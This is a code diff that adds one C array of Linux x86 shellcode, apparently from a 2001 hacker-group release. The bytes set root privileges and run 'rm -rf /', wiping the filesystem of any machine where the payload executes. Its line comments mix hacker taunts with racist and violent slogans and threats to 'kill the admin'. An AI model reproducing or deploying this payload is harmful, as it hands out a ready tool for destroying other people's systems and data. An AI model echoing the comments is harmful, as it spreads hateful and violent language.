@@ -1,0 +1,24 @@
+unsigned char ev1lrmb0xk0d3[] =
+"\xeb\x44"                 // ~el8 taken 0ver -- 2001
+"FAREWELL_MOTHERFUCKER!:>" // f1ght the p0wer -- 2001
+"\x99"                     // k1ll whitey -- 2001
+"\x89\xd0"                 // bl4q p0wer -- 2001
+"\xb0\x17"                 // h4il w1po -- 2001
+"\x89\xd3"                 // r1p k0dez -- 2001
+"\xcd\x80"                 // terr0riz old l4diez X'n the stre4t -- 2001
+"\x5b"                     // g3t l4id -- 2001
+"\xb0\x0b"                 // rm s0me mfq'n b0xez -- 2001
+"\x88\x53\x07"             // KILL THE BOX
+"\x88\x53\x0b"             // MAKE IT DEAD
+"\x88\x53\x0d"             // STRANGLE THE BOX
+"\x89\x5d\xf0"             // MAKE IT DEAD
+"\x8d\x4b\x08"             // KILL THE ADMIN
+"\x89\x4d\xf4"             // MAKE HIM DEAD
+"\x8d\x4b\x0c"             // RM THE BOX
+"\x89\x4d\xf8"             // MAKE IT CRY
+"\x89\x55\xfc"             // BEAT THE ADMIN
+"\x8d\x4d\xf0"             // MAKE HIM HIDE
+"\xcd\x80"                 // SAY FAREWALL
+"\xe8\xcf\xff\xff\xff"     // NOW THE BOX HAZ DIED
+"/bin/rmX-rfX/X"           // poem -- ~el8[2001]
+;
